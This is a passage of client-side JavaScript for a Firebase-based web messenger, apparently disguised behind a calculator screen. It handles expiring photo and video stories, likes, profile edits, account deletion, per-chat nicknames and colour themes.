        const mediaType = file.type.startsWith('video/') ? 'video' : 'image';

        // Upload with progress tracking
        const mediaUrl = await uploadImageToCloudinary(file, (progress) => {
            updateStoryUploadProgress(progress);
        });

        const authorName = currentUserData?.displayName || currentUser?.email || 'You';
        const authorAvatar = currentUserData?.photoURL || '';

        await addDoc(collection(db, 'stories'), {
            userId: currentUser.uid,
            mediaUrl,
            mediaType,
            createdAt: serverTimestamp(),
            authorName,
            authorAvatar,
            viewers: [],
            likes: []
        });
    } catch (error) {
        console.error('Error uploading story:', error);
        alert('Unable to publish your story. Please try again.');
    } finally {
        storyUploadInProgress = false;
        setStoryUploadState(false);
        hideStoryUploadProgress();
        if (storyFileInput) {
            storyFileInput.value = '';
        }
    }
}

function setStoryUploadState(isUploading) {
    if (!addStoryBtn) return;
    const label = addStoryBtn.querySelector('small');
    addStoryBtn.disabled = isUploading;
    if (isUploading) {
        addStoryBtn.classList.add('uploading');
        if (label) label.textContent = 'Uploading...';
        showStoryUploadProgress();
    } else {
        addStoryBtn.classList.remove('uploading');
        if (label) label.textContent = 'Add story';
    }
}

function showStoryUploadProgress() {
    const progressEl = document.getElementById('story-upload-progress');
    if (progressEl) {
        progressEl.classList.remove('hidden');
        const fill = progressEl.querySelector('.progress-bar-fill');
        const text = progressEl.querySelector('.progress-text');
        if (fill) fill.style.width = '0%';
        if (text) text.textContent = '0%';
    }
}

function updateStoryUploadProgress(percent) {
    const progressEl = document.getElementById('story-upload-progress');
    if (progressEl) {
        const fill = progressEl.querySelector('.progress-bar-fill');
        const text = progressEl.querySelector('.progress-text');
        if (fill) fill.style.width = `${percent}%`;
        if (text) text.textContent = `${Math.round(percent)}%`;
    }
}

function hideStoryUploadProgress() {
    const progressEl = document.getElementById('story-upload-progress');
    if (progressEl) {
        progressEl.classList.add('hidden');
    }
}

function subscribeToStories() {
    if (unsubscribeStories) {
        unsubscribeStories();
    }
    const storiesRef = collection(db, 'stories');
    const storiesQuery = query(storiesRef, orderBy('createdAt', 'desc'));
    unsubscribeStories = onSnapshot(storiesQuery, (snapshot) => {
        const now = Date.now();
        const cutoff = now - STORY_DURATION_MS;
        const stories = [];
        snapshot.forEach((docSnap) => {
            const data = docSnap.data();

            // Handle Firestore Timestamp conversion
            let createdAt = null;
            if (data.createdAt) {
                if (data.createdAt.toDate) {
                    createdAt = data.createdAt.toDate();
                } else if (data.createdAt instanceof Date) {
                    createdAt = data.createdAt;
                } else if (typeof data.createdAt === 'number') {
                    createdAt = new Date(data.createdAt);
                }
            }

            // Skip if createdAt is missing or invalid
            if (!createdAt || isNaN(createdAt.getTime())) {
                console.warn(`Story ${docSnap.id} has invalid createdAt, skipping`);
                return;
            }

            const createdAtTime = createdAt.getTime();

            // Only include stories that are less than 24 hours old
            // Add a small buffer (1 minute) to account for timing differences
            const storyAge = now - createdAtTime;
            const maxAge = STORY_DURATION_MS + (60 * 1000); // 24 hours + 1 minute buffer

            if (storyAge > maxAge) {
                // Story is too old, skip it
                return;
            }

            stories.push({
                id: docSnap.id,
                ...data,
                createdAt,
                viewers: data.viewers || [],
                likes: data.likes || []
            });
        });
        renderStories(stories);
    }, (error) => {
        // Suppress permission errors during logout
        if (error.code === 'permission-denied') {
            console.debug('Permission denied (expected during logout)');
        } else {
            console.error('Error subscribing to stories:', error);
        }
    });
}

function renderStories(stories = []) {
    if (!storyListEl) return;
    storiesByUser = new Map();
    stories.forEach((story) => {
        const arr = storiesByUser.get(story.userId) || [];
        arr.push(story);
        storiesByUser.set(story.userId, arr);
    });
    storyListEl.innerHTML = '';

    // Convert Map to array and sort by latest story timestamp
    const sortedUsers = Array.from(storiesByUser.entries()).sort((a, b) => {
        const storiesA = a[1];
        const storiesB = b[1];

        // Sort stories DESCENDING (latest first)
        storiesA.sort((s1, s2) => s2.createdAt - s1.createdAt);
        storiesB.sort((s1, s2) => s2.createdAt - s1.createdAt);

        const latestA = storiesA[0]; // First item is now the latest
        const latestB = storiesB[0];

        // Sort users by latest story timestamp (descending)
        // Handle potential missing createdAt (though filtered in subscribeToStories)
        const timeA = latestA?.createdAt?.getTime() || 0;
        const timeB = latestB?.createdAt?.getTime() || 0;

        return timeB - timeA;
    });

    sortedUsers.forEach(([userId, storyArr]) => {
        const latestStory = storyArr[0]; // First item is now the latest
        const card = document.createElement('button');
        card.className = 'story-card';
        card.type = 'button';
        card.dataset.userId = userId;
        if (currentUser && latestStory.viewers?.includes(currentUser.uid)) {
            card.classList.add('seen');
        }
        card.innerHTML = `
            <div class="story-avatar"></div>
            <small>${escapeHtml((latestStory.authorName || 'Story').split(' ')[0])}</small>
        `;
        const avatarEl = card.querySelector('.story-avatar');
        applyAvatarToElement(avatarEl, latestStory.authorAvatar, latestStory.authorName || latestStory.userId);
        card.addEventListener('click', () => openStorySequence(userId));
        storyListEl.appendChild(card);
    });

    if (storyListEl.children.length === 0) {
        const placeholder = document.createElement('div');
        placeholder.className = 'story-empty';
        placeholder.textContent = 'No stories yet';
        storyListEl.appendChild(placeholder);
    }

    if (storyViewer && !storyViewer.classList.contains('hidden') && activeStoryUserId) {
        const updatedSequence = storiesByUser.get(activeStoryUserId);
        if (!updatedSequence || updatedSequence.length === 0) {
            closeStoryViewer();
        } else {
            const currentStoryId = activeStorySequence?.[activeStoryIndex]?.id;
            activeStorySequence = updatedSequence;
            const idx = updatedSequence.findIndex(story => story.id === currentStoryId);
            if (idx !== -1) {
                activeStoryIndex = idx;
                updateStoryLikeUI(activeStorySequence[activeStoryIndex]);
            } else {
                activeStoryIndex = Math.min(activeStoryIndex, activeStorySequence.length - 1);
                showStoryAtIndex(activeStoryIndex);
            }
        }
    }
}

function openStorySequence(userId) {
    if (!storiesByUser.has(userId)) return;
    activeStorySequence = storiesByUser.get(userId);
    if (!activeStorySequence || activeStorySequence.length === 0) return;
    activeStoryUserId = userId;
    activeStoryIndex = 0;
    stopStoryProgress();
    if (storyViewer) {
        storyViewer.classList.remove('hidden');
    }
    showStoryAtIndex(activeStoryIndex);
}

function showStoryAtIndex(index) {
    if (!activeStorySequence || index < 0 || index >= activeStorySequence.length) {
        closeStoryViewer();
        return;
    }
    stopStoryProgress();
    activeStoryIndex = index;
    const story = activeStorySequence[index];

    // Render appropriate media element
    if (storyViewerMediaContainer) {
        const mediaType = story.mediaType || 'image'; // Default to image for old stories
        storyViewerMediaContainer.innerHTML = '';

        if (mediaType === 'video') {
            const video = document.createElement('video');
            video.src = story.mediaUrl;
            video.className = 'story-viewer-media';
            video.autoplay = true;
            video.loop = false;
            video.muted = false;
            video.controls = false;
            video.playsInline = true;

            // Handle video end event - auto-advance when video finishes
            video.addEventListener('ended', () => {
                stopStoryProgress();
                navigateStory(1);
            });

            storyViewerMediaContainer.appendChild(video);
        } else {
            const img = document.createElement('img');
            img.src = story.mediaUrl;
            img.alt = 'Story';
            img.className = 'story-viewer-media';
            storyViewerMediaContainer.appendChild(img);
        }
    }

    if (storyViewerName) {
        storyViewerName.textContent = story.authorName || 'Story';
    }
    if (storyViewerTime) {
        storyViewerTime.textContent = formatStoryTime(story.createdAt);
    }
    applyAvatarToElement(storyViewerAvatar, story.authorAvatar, story.authorName || story.userId);
    updateStoryNavButtons();
    markStoryViewed(story);
    updateStoryLikeUI(story);
    renderStoryProgressBars();

    // For videos, wait for metadata to load before starting progress
    const mediaElement = storyViewerMediaContainer?.querySelector('video, img');
    if (mediaElement && mediaElement.tagName === 'VIDEO') {
        if (mediaElement.readyState >= 1) {
            // Metadata already loaded
            startStoryProgress();
        } else {
            // Wait for metadata to load
            mediaElement.addEventListener('loadedmetadata', () => {
                startStoryProgress();
            }, { once: true });
        }
    } else {
        // For images, start immediately
        startStoryProgress();
    }
}

function updateStoryNavButtons() {
    if (storyPrevBtn) {
        storyPrevBtn.disabled = activeStoryIndex <= 0;
    }
    if (storyNextBtn) {
        storyNextBtn.disabled = activeStoryIndex >= activeStorySequence.length - 1;
    }
}

function navigateStory(direction) {
    if (!activeStorySequence) return;
    const newIndex = activeStoryIndex + direction;
    if (newIndex < 0 || newIndex >= activeStorySequence.length) {
        closeStoryViewer();
        return;
    }
    showStoryAtIndex(newIndex);
}

function closeStoryViewer() {
    if (storyViewer) {
        storyViewer.classList.add('hidden');
    }
    stopStoryProgress();
    updateStoryLikeUI(null);
    activeStorySequence = [];
    activeStoryUserId = null;
    activeStoryIndex = 0;
}

function renderStoryProgressBars() {
    if (!storyProgressEl || !activeStorySequence || activeStorySequence.length === 0) return;
    storyProgressEl.innerHTML = '';
    activeStorySequence.forEach((_, idx) => {
        const bar = document.createElement('div');
        bar.className = 'story-progress-bar';
        if (idx < activeStoryIndex) {
            bar.classList.add('completed');
        } else if (idx === activeStoryIndex) {
            bar.classList.add('active');
            const fill = document.createElement('div');
            fill.className = 'story-progress-fill';
            bar.appendChild(fill);
        }
        storyProgressEl.appendChild(bar);
    });
    storyProgressFillEl = storyProgressEl.querySelector('.story-progress-bar.active .story-progress-fill');
}

function startStoryProgress() {
    if (!storyProgressFillEl) return;

    const mediaElement = storyViewerMediaContainer?.querySelector('video, img');

    // For videos, use video duration; for images, use fixed duration
    let duration = STORY_AUTO_ADVANCE_MS;

    if (mediaElement && mediaElement.tagName === 'VIDEO') {
        const videoDuration = mediaElement.duration;
        if (videoDuration && !isNaN(videoDuration) && isFinite(videoDuration)) {
            duration = videoDuration * 1000; // Convert to milliseconds
        }
    }

    storyProgressStart = performance.now();
    storyProgressDuration = duration;
    storyProgressFillEl.style.width = '0%';
    storyProgressRaf = requestAnimationFrame(updateStoryProgressFrame);
}

function updateStoryProgressFrame(timestamp) {
    if (!storyProgressFillEl || storyViewer?.classList.contains('hidden')) {
        stopStoryProgress();
        return;
    }
    const elapsed = timestamp - (storyProgressStart || timestamp);
    const progress = Math.min(1, elapsed / storyProgressDuration);
    storyProgressFillEl.style.width = `${progress * 100}%`;
    if (progress >= 1) {
        stopStoryProgress();
        navigateStory(1);
        return;
    }
    storyProgressRaf = requestAnimationFrame(updateStoryProgressFrame);
}

function stopStoryProgress() {
    if (storyProgressRaf) {
        cancelAnimationFrame(storyProgressRaf);
    }
    storyProgressRaf = null;
    storyProgressStart = null;
    storyProgressFillEl = null;
}

function updateStoryLikeUI(story) {
    if (!storyLikeBtn || !storyLikeCountEl) return;
    if (!story) {
        storyLikeBtn.disabled = true;
        storyLikeBtn.classList.remove('liked');
        storyLikeBtn.textContent = '♡';
        storyLikeCountEl.textContent = '';
        return;
    }
    const likes = story.likes || [];
    const isLiked = !!(currentUser && likes.includes(currentUser.uid));
    storyLikeBtn.disabled = !currentUser;
    storyLikeBtn.classList.toggle('liked', isLiked);
    storyLikeBtn.textContent = isLiked ? '♥' : '♡';
    storyLikeCountEl.textContent = likes.length === 1 ? '1 like' : `${likes.length} likes`;
}

async function toggleStoryLike() {
    if (!currentUser || !activeStorySequence || !activeStorySequence[activeStoryIndex]) return;
    const story = activeStorySequence[activeStoryIndex];
    const storyRef = doc(db, 'stories', story.id);
    const likes = story.likes || [];
    const isLiked = likes.includes(currentUser.uid);
    try {
        if (isLiked) {
            await updateDoc(storyRef, {
                likes: arrayRemove(currentUser.uid)
            });
            story.likes = likes.filter(uid => uid !== currentUser.uid);
        } else {
            await updateDoc(storyRef, {
                likes: arrayUnion(currentUser.uid)
            });
            story.likes = [...likes, currentUser.uid];
        }
        updateStoryLikeUI(story);
    } catch (error) {
        console.error('Error toggling like:', error);
    }
}

function markStoryViewed(story) {
    if (!currentUser || story.viewers?.includes(currentUser.uid)) return;
    const storyRef = doc(db, 'stories', story.id);
    updateDoc(storyRef, {
        viewers: arrayUnion(currentUser.uid)
    }).catch((error) => console.error('Error marking story as viewed:', error));
}

function formatStoryTime(date) {
    if (!date) return '';
    const diff = Date.now() - date.getTime();
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
}

function openImageViewer(url) {
    if (!imageViewer || !imageViewerImg || !imageViewerDownload) return;
    imageViewerImg.src = url;

    // For Cloudinary URLs, add download parameter to force download
    let downloadUrl = url;
    if (url.includes('cloudinary')) {
        downloadUrl = url.replace('/upload/', '/upload/fl_attachment/');
    }

    imageViewerDownload.href = downloadUrl;
    const fileName = url.split('/').pop().split('?')[0];
    imageViewerDownload.setAttribute('download', fileName || 'image');
    imageViewerDownload.target = '_blank';
    imageViewer.classList.remove('hidden');
}

function closeImageViewer() {
    if (!imageViewer) return;
    imageViewer.classList.add('hidden');
    if (imageViewerImg) {
        imageViewerImg.src = '';
    }
}

async function handleImageDownload(e) {
    e.preventDefault();
    if (!imageViewerImg || !imageViewerImg.src) return;

    const url = imageViewerImg.src;
    const downloadBtn = e.target;

    try {
        downloadBtn.disabled = true;
        downloadBtn.textContent = 'Downloading...';

        const response = await fetch(url, { mode: 'cors' });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const blob = await response.blob();
        const fileName = getFileNameFromUrl(url);
        triggerFileDownload(blob, fileName);

        // Reset button
        downloadBtn.textContent = 'Download';
        downloadBtn.disabled = false;
    } catch (error) {
        console.error('Error downloading image:', error);
        downloadBtn.textContent = 'Download';
        downloadBtn.disabled = false;
        alert('Unable to download image right now. Please try again.');
    }
}

function triggerFileDownload(blob, filename) {
    const objectUrl = URL.createObjectURL(blob);
    const tempLink = document.createElement('a');
    tempLink.href = objectUrl;
    tempLink.download = filename || 'image';
    document.body.appendChild(tempLink);
    tempLink.click();
    document.body.removeChild(tempLink);
    URL.revokeObjectURL(objectUrl);
}

function getFileNameFromUrl(url) {
    try {
        const parsed = new URL(url);
        const segments = parsed.pathname.split('/');
        return segments.pop() || 'image';
    } catch (error) {
        return 'image';
    }
}

function openProfileModal() {
    if (!profileModal || !currentUser) return;
    profileModal.classList.remove('hidden');
    const name = currentUserData?.displayName || '';
    profileNameInput && (profileNameInput.value = name);
    profilePasscodeInput && (profilePasscodeInput.value = currentUserData?.passcode || '');
    profileStatusInput && (profileStatusInput.value = currentUserData?.statusMessage || '');
    profileAvatarTempUrl = null;
    applyAvatarToElement(profileAvatarCircle, currentUserData?.photoURL, name || currentUserData?.email || currentUser.email);
}

function closeProfileModal() {
    profileModal?.classList.add('hidden');
    profileAvatarTempUrl = null;
    if (profileAvatarInput) {
        profileAvatarInput.value = '';
    }
}

async function handleProfileAvatarChange(event) {
    const file = event.target.files[0];
    if (!file) return;
    if (changeAvatarBtn) {
        changeAvatarBtn.textContent = 'Uploading...';
        changeAvatarBtn.disabled = true;
    }
    avatarUploadInProgress = true;
    try {
        const url = await uploadImageToCloudinary(file);
        profileAvatarTempUrl = url;
        applyAvatarToElement(profileAvatarCircle, url, currentUserData?.displayName || currentUserData?.email || currentUser?.email);
    } catch (error) {
        console.error('Error uploading avatar:', error);
        alert('Failed to upload avatar. Please try again.');
    } finally {
        avatarUploadInProgress = false;
        if (changeAvatarBtn) {
            changeAvatarBtn.textContent = 'Change photo';
            changeAvatarBtn.disabled = false;
        }
        if (profileAvatarInput) {
            profileAvatarInput.value = '';
        }
    }
}

async function saveProfileChanges() {
    if (!currentUser || !currentUserData) return;
    if (avatarUploadInProgress) {
        alert('Please wait for the avatar upload to finish.');
        return;
    }

    const updates = {};
    const newName = profileNameInput?.value.trim();
    const newPasscode = profilePasscodeInput?.value.trim();
    const newStatusMessage = profileStatusInput?.value.trim();

    if (newName && newName !== currentUserData.displayName) {
        updates.displayName = newName;
    }
    if (typeof newPasscode === 'string' && newPasscode !== currentUserData.passcode) {
        updates.passcode = newPasscode;
    }
    if ((newStatusMessage || currentUserData.statusMessage) && newStatusMessage !== (currentUserData.statusMessage || '')) {
        updates.statusMessage = newStatusMessage;
    }
    if (profileAvatarTempUrl) {
        updates.photoURL = profileAvatarTempUrl;
    }

    if (Object.keys(updates).length === 0) {
        closeProfileModal();
        return;
    }

    try {
        if (saveProfileBtn) {
            saveProfileBtn.disabled = true;
            saveProfileBtn.textContent = 'Saving...';
        }
        await updateDoc(doc(db, 'users', currentUser.uid), updates);
        closeProfileModal();
    } catch (error) {
        console.error('Error saving profile:', error);
        alert('Could not save your profile. Please try again.');
    } finally {
        if (saveProfileBtn) {
            saveProfileBtn.disabled = false;
            saveProfileBtn.textContent = 'Save changes';
        }
    }
}

function openDeleteAccountModal() {
    deleteEmailInput.value = '';
    deleteEmailError.classList.add('hidden');
    deleteEmailError.textContent = '';
    deleteAccountModal.classList.remove('hidden');
}

function closeDeleteAccountModal() {
    deleteAccountModal.classList.add('hidden');
    deleteEmailInput.value = '';
    deleteEmailError.classList.add('hidden');
}

async function confirmDeleteAccount() {
    if (!currentUser) return;

    const enteredEmail = deleteEmailInput.value.trim();
    const userEmail = currentUser.email;

    if (!enteredEmail) {
        deleteEmailError.textContent = 'Please enter your email';
        deleteEmailError.classList.remove('hidden');
        return;
    }

    if (enteredEmail !== userEmail) {
        deleteEmailError.textContent = 'Email does not match';
        deleteEmailError.classList.remove('hidden');
        return;
    }

    try {
        confirmDeleteBtn.disabled = true;
        confirmDeleteBtn.textContent = 'Deleting...';
        showLoading('Deleting account...');
        const userId = currentUser.uid;

        // Delete all user's chats and messages
        const chatsSnapshot = await getDocs(collection(db, 'chats'));
        for (const chatDoc of chatsSnapshot.docs) {
            const chatData = chatDoc.data();
            // Only delete chats where user is a participant
            if (chatData.participants && chatData.participants.includes(userId)) {
                // Delete all messages in this chat
                const messagesSnapshot = await getDocs(collection(db, 'chats', chatDoc.id, 'messages'));
                for (const messageDoc of messagesSnapshot.docs) {
                    await deleteDoc(doc(db, 'chats', chatDoc.id, 'messages', messageDoc.id));
                }
                // Delete the chat document
                await deleteDoc(doc(db, 'chats', chatDoc.id));
            }
        }

        // Delete all user's stories
        const storiesSnapshot = await getDocs(collection(db, 'stories'));
        for (const storyDoc of storiesSnapshot.docs) {
            const storyData = storyDoc.data();
            if (storyData.userId === userId) {
                await deleteDoc(doc(db, 'stories', storyDoc.id));
            }
        }

        // Delete user profile
        await deleteDoc(doc(db, 'users', userId));

        // Delete Firebase Auth account
        await currentUser.delete();

        // Sign out
        await signOut(auth);

        hideLoading();
        closeDeleteAccountModal();
        alert('Your account has been permanently deleted.');

        // Redirect to calculator view
        chatApp.classList.add('hidden');
        calculatorView.classList.remove('hidden');
        currentValue = '0';
        updateDisplay(currentValue);
    } catch (error) {
        hideLoading();
        confirmDeleteBtn.disabled = false;
        confirmDeleteBtn.textContent = 'Delete My Account';
        console.error('Error deleting account:', error);
        if (error.code === 'auth/requires-recent-login') {
            deleteEmailError.textContent = 'For security, please log out and log back in before deleting.';
        } else {
            deleteEmailError.textContent = 'Error: ' + error.message;
        }
        deleteEmailError.classList.remove('hidden');
    }
}

// ===========================
// Nickname System
// ===========================
function openChatSettingsModal() {
    if (!chatSettingsModal || !currentChatUser) return;

    // Populate profile section
    const chatSettingsAvatar = document.getElementById('chat-settings-avatar');
    const chatSettingsProfileName = document.getElementById('chat-settings-profile-name');
    const chatSettingsProfileStatus = document.getElementById('chat-settings-profile-status');

    if (chatSettingsAvatar) {
        chatSettingsAvatar.textContent = currentChatUser.displayName?.charAt(0).toUpperCase() || '?';
        if (currentChatUser.photoURL) {
            chatSettingsAvatar.style.backgroundImage = `url(${currentChatUser.photoURL})`;
            chatSettingsAvatar.style.backgroundSize = 'cover';
            chatSettingsAvatar.style.backgroundPosition = 'center';
            chatSettingsAvatar.textContent = '';
        }
    }

    if (chatSettingsProfileName) {
        chatSettingsProfileName.textContent = currentChatUser.displayName || 'User';
    }

    if (chatSettingsProfileStatus) {
        chatSettingsProfileStatus.textContent = currentChatUser.statusMessage || 'Messenger';
    }

    // Load current nickname if exists
    const nickname = userNicknames.get(currentChatUser.uid) || '';
    nicknameInput.value = nickname;

    // Load current theme if exists
    const theme = chatThemes.get(currentChatId) || getDefaultTheme();
    sentBubbleColorInput.value = theme.sentBubbleColor;
    receivedBubbleColorInput.value = theme.receivedBubbleColor;
    bgColorInput.value = theme.bgColor;

    // Update color value displays
    updateColorValueDisplays();

    // Update theme preview
    updateThemePreview();

    // Update preset button states
    updatePresetButtonStates('default');

    // Show/hide remove bg image button
    if (theme.bgImage) {
        removeBgImageBtn.classList.remove('hidden');
    } else {
        removeBgImageBtn.classList.add('hidden');
    }

    chatSettingsModal.classList.remove('hidden');
}

function closeChatSettingsModal() {
    if (!chatSettingsModal) return;
    chatSettingsModal.classList.add('hidden');
    nicknameInput.value = '';
}

async function saveNickname() {
    if (!currentChatUser || !currentUser) return;

    const newNickname = nicknameInput.value.trim();
    const oldNickname = userNicknames.get(currentChatUser.uid) || currentChatUser.displayName;

    if (!newNickname) {
        alert('Please enter a nickname');
        return;
    }

    if (newNickname === oldNickname) {
        closeChatSettingsModal();
        return;
    }

    try {
        // Update local map
        userNicknames.set(currentChatUser.uid, newNickname);

        // Save to localStorage for persistence
        const nicknamesData = JSON.stringify(Array.from(userNicknames.entries()));
        localStorage.setItem(`nicknames_${currentUser.uid}`, nicknamesData);

        // Update chat header to show new nickname
        const chatUserNameEl = document.getElementById('chat-user-name');
        if (chatUserNameEl) {
            chatUserNameEl.textContent = newNickname;
        }

        // Update user list to show new nickname
        const userItemEl = document.querySelector(`.user-item[data-user-id="${currentChatUser.uid}"]`);
        if (userItemEl) {
            const userNameEl = userItemEl.querySelector('.user-name');
            if (userNameEl) {
                userNameEl.textContent = newNickname;
            }
        }

        // Send system message
        const senderName = currentUserData?.displayName || currentUser.displayName || 'User';
        await addSystemMessage(`${senderName} set your nickname to ${newNickname}`);

        closeChatSettingsModal();
    } catch (error) {
        console.error('Error saving nickname:', error);
        alert('Failed to save nickname');
    }
}

async function removeNickname() {
    if (!currentChatUser || !currentUser) return;

    try {
        // Remove from local map
        userNicknames.delete(currentChatUser.uid);

        // Save to localStorage
        const nicknamesData = JSON.stringify(Array.from(userNicknames.entries()));
        localStorage.setItem(`nicknames_${currentUser.uid}`, nicknamesData);

        // Update chat header to show original name
        const chatUserNameEl = document.getElementById('chat-user-name');
        if (chatUserNameEl) {
            chatUserNameEl.textContent = currentChatUser.displayName;
        }

        // Update user list to show original name
        const userItemEl = document.querySelector(`.user-item[data-user-id="${currentChatUser.uid}"]`);
        if (userItemEl) {
            const userNameEl = userItemEl.querySelector('.user-name');
            if (userNameEl) {
                userNameEl.textContent = currentChatUser.displayName;
            }
        }

        // Send system message
        const senderName = currentUserData?.displayName || currentUser.displayName || 'User';
        await addSystemMessage(`${senderName} removed your nickname`);

        closeChatSettingsModal();
    } catch (error) {
        console.error('Error removing nickname:', error);
        alert('Failed to remove nickname');
    }
}

async function addSystemMessage(text) {
    if (!currentChatId || !currentUser) return;

    try {
        const messagesRef = collection(db, 'chats', currentChatId, 'messages');
        await addDoc(messagesRef, {
            text: text,
            senderId: currentUser.uid,
            senderName: currentUser.displayName,
            timestamp: serverTimestamp(),
            type: 'system',
            seen: false,
            reactions: [],
            replyTo: null,
            isEdited: false,
            isDeleted: false
        });
    } catch (error) {
        console.error('Error adding system message:', error);
    }
}

// ===========================
// Chat Theme System
// ===========================

// Theme Presets
const THEME_PRESETS = {
    default: {
        name: 'Default',
        sentBubbleColor: '#0084ff',
        receivedBubbleColor: '#2a2a2a',
        bgColor: '#050505'
    },
    ocean: {
        name: 'Ocean',
        sentBubbleColor: '#00a8e8',
        receivedBubbleColor: '#003d5c',
        bgColor: '#0a1929'
    },
    sunset: {
        name: 'Sunset',
        sentBubbleColor: '#ff6b35',
        receivedBubbleColor: '#f7931e',
        bgColor: '#1a0f0a'
    },
    forest: {
        name: 'Forest',
        sentBubbleColor: '#2d6a4f',
        receivedBubbleColor: '#1b4332',
        bgColor: '#0b2e1a'
    },
    purple: {
        name: 'Purple',
        sentBubbleColor: '#9d4edd',
        receivedBubbleColor: '#5a189a',
        bgColor: '#1a0f2e'
    },
    dark: {
        name: 'Dark',
        sentBubbleColor: '#1a1a1a',
        receivedBubbleColor: '#0d0d0d',
        bgColor: '#000000'
    }
};

function getDefaultTheme() {
    return {
        sentBubbleColor: '#0084ff',      // Blue - white text
        receivedBubbleColor: '#2a2a2a',  // Dark gray - white text
        bgColor: '#050505',              // Much darker background
        bgImage: null,
        bgImageOverlay: true
    };
}

function applyThemePreset(presetName) {
    if (!THEME_PRESETS[presetName]) return;

    const preset = THEME_PRESETS[presetName];
    sentBubbleColorInput.value = preset.sentBubbleColor;
    receivedBubbleColorInput.value = preset.receivedBubbleColor;
    bgColorInput.value = preset.bgColor;

    // Update color value displays
    updateColorValueDisplays();

    // Update live preview
    updateThemePreview();

    // Update preset button active state
    updatePresetButtonStates(presetName);
}

function updateColorValueDisplays() {
    document.getElementById('sent-color-value').textContent = sentBubbleColorInput.value.toUpperCase();
    document.getElementById('received-color-value').textContent = receivedBubbleColorInput.value.toUpperCase();
    document.getElementById('bg-color-value').textContent = bgColorInput.value.toUpperCase();
}

function updateThemePreview() {
    const sentColor = sentBubbleColorInput.value;
    const receivedColor = receivedBubbleColorInput.value;
    const bgColor = bgColorInput.value;

    // Update preview bubbles
    const previewContainer = document.querySelector('.message-preview-container');
    if (previewContainer) {
        const sentBubble = previewContainer.querySelector('.preview-message.sent .preview-bubble');
        const receivedBubble = previewContainer.querySelector('.preview-message.received .preview-bubble');

        if (sentBubble) sentBubble.style.backgroundColor = sentColor;
        if (receivedBubble) receivedBubble.style.backgroundColor = receivedColor;

        previewContainer.style.backgroundColor = bgColor;
    }
}

function updatePresetButtonStates(activePreset) {
    document.querySelectorAll('.theme-preset-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.preset === activePreset) {
            btn.classList.add('active');
        }
    });
}

function handleBgImageChange(event) {
    const file = event.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (e) => {
        const imageData = e.target?.result;
        if (imageData && typeof imageData === 'string') {
            // Store the image data URL temporarily
            const theme = chatThemes.get(currentChatId) || getDefaultTheme();
            theme.bgImage = imageData;
            chatThemes.set(currentChatId, theme);

            // Show remove button
            removeBgImageBtn.classList.remove('hidden');
        }
    };
    reader.readAsDataURL(file);
}

function removeBgImage() {
    const theme = chatThemes.get(currentChatId) || getDefaultTheme();
    theme.bgImage = null;
    chatThemes.set(currentChatId, theme);
    bgImageInput.value = '';
    removeBgImageBtn.classList.add('hidden');
}

async function applyTheme() {
    if (!currentChatId) return;

    try {
        const theme = {
            sentBubbleColor: sentBubbleColorInput.value,
            receivedBubbleColor: receivedBubbleColorInput.value,
            bgColor: bgColorInput.value,
            bgImage: chatThemes.get(currentChatId)?.bgImage || null,
            bgImageOverlay: true,
            updatedBy: currentUser.uid,
            updatedAt: serverTimestamp()
        };

        // Save to local map
        chatThemes.set(currentChatId, theme);

        // Save to localStorage
        const themesData = JSON.stringify(Array.from(chatThemes.entries()));
        localStorage.setItem(`themes_${currentUser.uid}`, themesData);

        // Save to Firestore so other user can see the theme
        const themeRef = doc(db, 'chats', currentChatId, 'metadata', 'theme');
        await setDoc(themeRef, theme, { merge: true });

        // Apply theme to chat
        applyThemeToChat(theme);

        closeChatSettingsModal();
    } catch (error) {
        console.error('Error applying theme:', error);
        alert('Failed to apply theme');
    }
}

async function resetTheme() {
    const defaultTheme = getDefaultTheme();
    sentBubbleColorInput.value = defaultTheme.sentBubbleColor;
    receivedBubbleColorInput.value = defaultTheme.receivedBubbleColor;
    bgColorInput.value = defaultTheme.bgColor;
    bgImageInput.value = '';

    // Remove from map and localStorage
    chatThemes.delete(currentChatId);
    const themesData = JSON.stringify(Array.from(chatThemes.entries()));
    localStorage.setItem(`themes_${currentUser.uid}`, themesData);

    // Delete theme from Firestore so other user also sees default
    try {
        const themeRef = doc(db, 'chats', currentChatId, 'metadata', 'theme');
        await deleteDoc(themeRef);
    } catch (error) {
        console.error('Error deleting theme from Firestore:', error);
    }

    // Apply default theme
    applyThemeToChat(defaultTheme);
}

function showClearChatConfirmation() {
    if (!currentChatId) return;
    // Show custom confirmation modal
    clearChatConfirmationModal.classList.remove('hidden');
}

function closeClearChatConfirmation() {
    clearChatConfirmationModal.classList.add('hidden');
}

async function confirmClearAllChats() {
    if (!currentChatId) return;

    try {
        // Close confirmation modal
        closeClearChatConfirmation();

        // Show loading state
        clearAllChatsBtn.disabled = true;
        clearAllChatsBtn.textContent = 'Clearing...';

        // Get all messages in the chat
        const messagesRef = collection(db, 'chats', currentChatId, 'messages');
        const snapshot = await getDocs(messagesRef);

        // Delete each message
        let deletedCount = 0;
        for (const doc of snapshot.docs) {
            await deleteDoc(doc.ref);
            deletedCount++;
        }

        console.log(`Deleted ${deletedCount} messages from chat ${currentChatId}`);

        // Clear local messages container
        messagesContainer.innerHTML = '';

        // Show success notification in UI
        showNotification(`✅ Successfully deleted ${deletedCount} messages from the database!`, 3000);

        // Close settings modal after a short delay
        setTimeout(() => {
            closeChatSettingsModal();
        }, 500);
    } catch (error) {
        console.error('Error clearing chats:', error);
        showNotification('❌ Failed to clear messages. Please try again.', 3000);
    } finally {
        clearAllChatsBtn.disabled = false;
        clearAllChatsBtn.textContent = 'Clear All Messages';
    }
}

function applyThemeToChat(theme) {
    const messagesContainer = document.getElementById('messages-container');
    const chatWindowContainer = document.getElementById('chat-window-container');
    if (!messagesContainer || !chatWindowContainer) return;

    // Apply background to chat window container (so it covers header and input too)
    if (theme.bgImage) {
        chatWindowContainer.style.backgroundImage = `url(${theme.bgImage})`;
        chatWindowContainer.style.backgroundSize = 'cover';
        chatWindowContainer.style.backgroundPosition = 'center';
        chatWindowContainer.style.backgroundAttachment = 'fixed';

        // Apply semi-transparent overlay for readability
        if (theme.bgImageOverlay) {
            messagesContainer.style.backgroundColor = 'rgba(0, 0, 0, 0.4)';
